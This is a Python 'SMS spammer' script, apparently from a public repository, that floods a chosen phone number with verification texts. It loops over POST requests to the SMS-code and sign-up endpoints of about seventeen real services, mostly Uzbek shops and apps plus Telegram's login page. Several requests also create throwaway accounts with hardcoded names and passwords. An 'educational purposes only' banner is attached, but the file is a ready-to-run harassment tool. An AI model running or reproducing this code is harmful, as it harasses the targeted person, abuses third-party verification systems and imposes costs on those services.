import requests
import json
import time
import colorama
from colorama import Fore, Back, Style
from colorama import init
init(autoreset=True)

Rules = '\033[94m' """ 
     ____________________________________________________
    |                                                    |
    |                  -----------                       |
    |                  SMS SPAMMER                       |
    |                  -----------                       |
    |                    @takv54                         |
    |  ================================================= |                                                 
    |     This program was created for educational       |
    |   purposes only. All responsibility is on you      |
    |  The author is not responsible for your actions    |
    |   Using this program, you agree to use it for      |
    |  informational purposes only.                      |
    |                                                    |
    |____________________________________________________|
    
"""
print (Rules) # created by https://github.com/database-max/spbmr
mynumber = input('\033[91m' 'HELLO! ENTER THE NUMBER (998xxxxxxxxx)-->>  ')
CLOSE_AFTER = int(input("ENTER TIME IN SECONDS  "  ))
start_time = time.time()
safia = '+'+mynumber[0:3]+' '+mynumber[3:5]+' '+mynumber[5:8]+'-'+mynumber[8:10]+'-'+mynumber[10:12]
farm = '+'+mynumber[0:3]+' ' '('+mynumber[3:5]+')'+' '+mynumber[5:8]+'-'+mynumber[8:10]+'-'+mynumber[10:12]
invest = mynumber[3:12]
express = '+'+mynumber[0:3]+' '+mynumber[3:5]+' '+mynumber[5:8]+' '+mynumber[8:10]+' '+mynumber[10:12] 
technomart = '+'+mynumber[0:3]+' '+mynumber[3:5]+' '+mynumber[5:8]+' '+mynumber[8:10]+' '+mynumber[10:12]
outlas = mynumber[3:12]
creditasia = mynumber[4:4]+'('+mynumber[5:7]+')'+mynumber[5:8]+' '+mynumber[8:10]+' '+mynumber[10:12]
if CLOSE_AFTER > 100:
	print('ERROR THE VALUE CANNOT BE MORE THAN 100!')
	exit()
while True :
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 try:
    requests.post('https://api.webpos.uz/api/client/sendsms', json={"phoneNumber": mynumber}  )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    requests.post('https://safiabakery.uz/ajax/check-phone', data={'SignupForm[phone]': safia} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://pharmaclick.uz/bitrix/services/main/ajax.php?mode=class&c=infinity:authBySMS&action=checkPhone', data={'phone': farm} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://api.insurance.uz/api/code', data={'phone': invest} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://api.express24.uz/client/v4/authentication/code', json={'phone': express} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://io.bellissimo.uz/api/verify', data={'phone': '+'+ mynumber} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://bizzon.uz/kuponator&api=send_reg_confirm_sms', data={'phone': '+'+ mynumber} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://api.bringo.uz/api/v1/register/phone', json={'phone': mynumber} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://glotr.uz/user/ru/registration-as-user/', data={'RegistrationForm[first_name]': 'WILLIAM', 'RegistrationForm[phone_number]': '+'+ mynumber, 'RegistrationForm[privacy_policy]': '1'} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://my.telegram.org/auth/send_password', data={'phone': '+'+ mynumber})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:

    requests.post('https://api.brandstore.uz/api/auth/code/create/', data={"phone": mynumber})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://www.creditasia.uz/personal/registration/', data={"reg": "reg", "family": "William", "username": "John", "phone": creditasia})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://greyder.uz/register/form', data={"profile[firstName]": "Test", "profile[lastName]": "william", "profile[phoneNumber]": mynumber, "password[first]": "pokiuj22fdfc", "password[second]": "pokiuj22fdfc"})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://kittek.uz/local/ajax/common.php', data={"handler": "AuthAjaxHandler", "func": "registrationStepOne", "phone": mynumber})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://mobile.olcha.uz/api/v2/sendsms', data={"phone": mynumber})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    requests.post('https://sello.uz/api/market/user/sign-up',  json={"phone": mynumber,"password":"qazwsxedc","password_repeat":"qazwsxedc"} )
    print('\033[1;32m''sms sent!')
 except:
     print('ERROR')
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://backend.texnomart.uz/api/v1/user/register', json={"phone": technomart, "first_name":"William", "last_name":"Johns"})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
 time.sleep(0.5) # created by https://github.com/database-max/spbmr